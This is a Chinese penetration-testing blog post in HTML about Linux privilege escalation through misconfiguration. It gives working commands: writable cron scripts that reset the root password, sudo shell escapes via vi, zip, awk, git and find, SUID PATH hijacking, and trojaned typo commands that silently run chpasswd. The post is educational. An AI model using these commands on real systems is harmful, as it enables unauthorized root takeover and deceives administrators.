@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    linux常见提权方式总结 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",linux,提权">
+<meta name="description" content="前言提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。
+1. crontab定时任务提权crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。
+我们可以通过如下指令来编辑和查看当前工作表命令 
+1234crontab [-u usernam">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux常见提权方式总结 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2020/02/12/linux常见提权方式总结/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="前言提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。
+1. crontab定时任务提权crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。
+我们可以通过如下指令来编辑和查看当前工作表命令 
+1234crontab [-u usernam">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo02.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo03.png">
+<meta property="og:updated_time" content="2020-02-12T15:03:39.779Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux常见提权方式总结 | Leticia‘s Blog">
+<meta name="twitter:description" content="前言提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。
+1. crontab定时任务提权crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。
+我们可以通过如下指令来编辑和查看当前工作表命令 
+1234crontab [-u usernam">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo01.png">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 40</a><a href="/tags/python/" class="tagc2">python : 14</a><a href="/tags/笔记/" class="tagc3">笔记 : 14</a><a href="/tags/机器学习/" class="tagc4">机器学习 : 13</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/sql注入/" class="tagc2">sql注入 : 5</a><a href="/tags/网络安全/" class="tagc3">网络安全 : 5</a><a href="/tags/暴力破解/" class="tagc4">暴力破解 : 4</a><a href="/tags/工具配置/" class="tagc5">工具配置 : 3</a><a href="/tags/ctf/" class="tagc1">ctf : 3</a><a href="/tags/文件上传/" class="tagc2">文件上传 : 3</a><a href="/tags/代码审计/" class="tagc3">代码审计 : 2</a><a href="/tags/XSS/" class="tagc4">XSS : 2</a><a href="/tags/内网渗透/" class="tagc5">内网渗透 : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc1">逻辑处理漏洞 : 2</a><a href="/tags/密码学/" class="tagc2">密码学 : 2</a><a href="/tags/硬件安全/" class="tagc3">硬件安全 : 2</a><a href="/tags/shell/" class="tagc4">shell : 2</a><a href="/tags/crlf/" class="tagc5">crlf : 1</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">linux常见提权方式总结</h1>
+    
+    <div class="post-meta">
+      <time datetime="2020-02-12 23:00:00" class="post-meta__date date">2020-02-12 23:00:00</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/提权/">提权</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/linux-提权/">linux,提权</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。</p>
+<h2 id="1-crontab定时任务提权"><a href="#1-crontab定时任务提权" class="headerlink" title="1. crontab定时任务提权"></a>1. crontab定时任务提权</h2><p>crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。</p>
+<p>我们可以通过如下指令来编辑和查看当前工作表命令 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">crontab [-u username]　　　　//省略用户表表示操作当前用户的crontab</div><div class="line">    -e      (编辑工作表)</div><div class="line">    -l      (列出工作表里的命令)</div><div class="line">    -r      (删除工作表)</div></pre></td></tr></table></figure>
+<p>更多的crontab操作可以参考教程 <a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" target="_blank" rel="external">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a> </p>
+<h3 id="1-1-root权限定时任务脚本普通用户可写"><a href="#1-1-root权限定时任务脚本普通用户可写" class="headerlink" title="1.1 root权限定时任务脚本普通用户可写"></a>1.1 root权限定时任务脚本普通用户可写</h3><p>以root权限执行的定时任务或其所在文件夹，低权限用户拥有写权限，则可进行提权。</p>
+<p>示例：</p>
+<p>切换到root用户，输入crontab -e，添加一个一分钟执行一次的shell脚本，然后赋予此脚本执行权限和其他用户可写权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * /home/test/cron.sh</div></pre></td></tr></table></figure>
+<p>开启其他shell，切换到普通用户，修改脚本内容为重置root密码，或者添加此普通用户权限等操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;root:password&quot; | chpasswd</div></pre></td></tr></table></figure>
+<p>然后su root使用更改后密码切换至root</p>
+<p>如果文件不可写而文件夹可写的情况，如下图情况，可以删除到整个路径，然后重新由普通用户创建路径和其中脚本，就变成可写的情况了。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo01.png" alt=""></p>
+<h3 id="1-2-root权限定时任务调用的脚本普通用户可写"><a href="#1-2-root权限定时任务调用的脚本普通用户可写" class="headerlink" title="1.2 root权限定时任务调用的脚本普通用户可写"></a>1.2 root权限定时任务调用的脚本普通用户可写</h3><p>很多时候，定时任务并不是孤立存在的，它会去调用很多别的shell脚本来完成一些操作，而root权限的定时任务调用的脚本也会以root权限执行，所以我们仍需要关注其调用的其他脚本是否普通用户可写，如果可写，仍然可以提权。</p>
+<p>查询此类脚本的方法是首先找到root的定时任务 xxx.sh，然后在文件种查找其他shell脚本即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep &quot;*.sh&quot; xxx.sh</div></pre></td></tr></table></figure>
+<h2 id="2-sudo脚本提权"><a href="#2-sudo脚本提权" class="headerlink" title="2. sudo脚本提权"></a>2. sudo脚本提权</h2><p>sudo脚本提权，主要和/etc/sudoers配置文件有关，主要由以下三种配置引起：</p>
+<ul>
+<li><p>1.在sudoers文件中配置的脚本在运行时默认以root权限执行</p>
+</li>
+<li><p>2.在sudoers文件中配置的文件夹，内部所有脚本默认以root权限执行</p>
+</li>
+<li><p>3.在sudoers文件中配置的系统命令，默认以root权限执行</p>
+</li>
+</ul>
+<p>而这三种配置就引出了三种提权方式，在这里作者分别配置了，/home/test/sudotest.sh文件，/home/test/sudo文件夹，以及zip,tar,more三个命令，分别对应了上述三种情况</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo02.png" alt=""></p>
+<h3 id="2-1-sudoers文件中配置的脚本文件"><a href="#2-1-sudoers文件中配置的脚本文件" class="headerlink" title="2.1 sudoers文件中配置的脚本文件"></a>2.1 sudoers文件中配置的脚本文件</h3><p>/etc/sudoers中配置的sudo脚本文件低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
+<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cd /home/test</div><div class="line">echo &quot;bin/bash&quot; &gt; sudotest.sh</div><div class="line">chmod +x sudotest.sh</div><div class="line">sudo ./sudotest.sh</div></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo03.png" alt=""></p>
+<h3 id="2-2-sudoers文件中配置的文件夹"><a href="#2-2-sudoers文件中配置的文件夹" class="headerlink" title="2.2 sudoers文件中配置的文件夹"></a>2.2 sudoers文件中配置的文件夹</h3><p>/etc/sudoers中配置的sudo文件夹低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
+<p>在之前的配置中我们可以看到，在/home/test/sudo这个test用户可控目录以test随意创建脚本使用sudo执行均是免root密码的。</p>
+<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cd /home/test/sudo</div><div class="line">echo &quot;/bin/bash&quot; &gt; test.sh</div><div class="line">chmod +x test.sh</div><div class="line">sudo ./test.sh</div></pre></td></tr></table></figure></p>
+<h3 id="2-3-使用系统命令sudo提权"><a href="#2-3-使用系统命令sudo提权" class="headerlink" title="2.3 使用系统命令sudo提权"></a>2.3 使用系统命令sudo提权</h3><p>如vi，more，less，tar，zip，awk，git，find等命令，如在/etc/sudoers中配置，即存在sudo提权</p>
+<p>vi,more,less的命令sudo提权方式都是使用对应命令sudo打开一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo vi filename</div><div class="line">sudo more filename</div><div class="line">sudo less filename</div></pre></td></tr></table></figure></p>
+<p>然后在打开界面输入!/bin/bash，即可获得root权限的shell</p>
+<p>zip命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">zip filename.zip 123.txt -T --unzip-command=&quot;!/bin/bash&quot;</div></pre></td></tr></table></figure></p>
+<p>awk命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</div></pre></td></tr></table></figure></p>
+<p>git命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo git help status</div><div class="line">!/bin/bash</div></pre></td></tr></table></figure></p>
+<p>find命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo find /bin/ -name ls -exec /bin/bash \;</div></pre></td></tr></table></figure></p>
+<h2 id="3-环境变量提权"><a href="#3-环境变量提权" class="headerlink" title="3. 环境变量提权"></a>3. 环境变量提权</h2><h3 id="3-1-具有S权限位的脚本"><a href="#3-1-具有S权限位的脚本" class="headerlink" title="3.1 具有S权限位的脚本"></a>3.1 具有S权限位的脚本</h3><p>Linux中通过设置suid，可以让程序的执行者临时拥有属主的权限，可以使用下面的命令查找具有suid的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</div><div class="line">find / -perm -u=s -type f 2&gt;/dev/null</div></pre></td></tr></table></figure></p>
+<p>然后具有s权限位的这些脚本中如果存在可控环境变量。如脚本中存在调用ps程序，我们可以在低权限用户可写目录中写一个ps文件，内容为/bin/bash，然后将此目录添加到环境变量最优先寻找的目录，再执行脚本，脚本就会以root权限触发/bin/bash，就产生了一个root权限的shell，完成提权。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo &quot;/bin/bash&quot; &gt; /home/test/ps</div><div class="line">export PATH=/home/test:$PATH</div></pre></td></tr></table></figure></p>
+<h3 id="3-2-root的环境变量设置了用户可控目录"><a href="#3-2-root的环境变量设置了用户可控目录" class="headerlink" title="3.2 root的环境变量设置了用户可控目录"></a>3.2 root的环境变量设置了用户可控目录</h3><p>root的$PATH若设置了用户可控的目录，用户可以在此可控目录写入一些命令并诱导root用户输入，在这些文件中填充修改root密码的命令或给其他用户添加权限等命令，然后当root用户被诱导输入一些环境变量中配置的指令时就会执行这些命令。通常会配置一些容易输错的单词，并在后面加入返回命令不存在的提示。</p>
+<p>如文件名设置为whomai，与正常的命令whoami颠倒了一点顺序，有时手快会输入错误。<br>然后在whoami中配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</div><div class="line">echo &quot;bash: whomai: 未找到命令&quot;</div></pre></td></tr></table></figure></p>
+<p>当然我们可以配置非常多的文件名来增加触发概率。</p>
+<h3 id="3-3-su切换而不是su-切换导致携带用户环境变量"><a href="#3-3-su切换而不是su-切换导致携带用户环境变量" class="headerlink" title="3.3 su切换而不是su -切换导致携带用户环境变量"></a>3.3 su切换而不是su -切换导致携带用户环境变量</h3><p>linux系统在使用su切换时，会携带当前用户的环境变量，使用su -则不会，如果在当前用户环境变量设置如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export PATH=/home/test/ps:$PATH</div></pre></td></tr></table></figure></p>
+<p>编辑一个ps文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</div><div class="line">ps</div></pre></td></tr></table></figure></p>
+<p>那么在从此用户切换到root的管理员，在使用ps时就会修改掉root用户密码。</p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2020/02/12/linux常见提权方式总结/" target="_blank">linux常见提权方式总结</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2020-02-12 23:00:00<br />
+    <span>最后更新:</span>2020-02-12 23:03:39<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
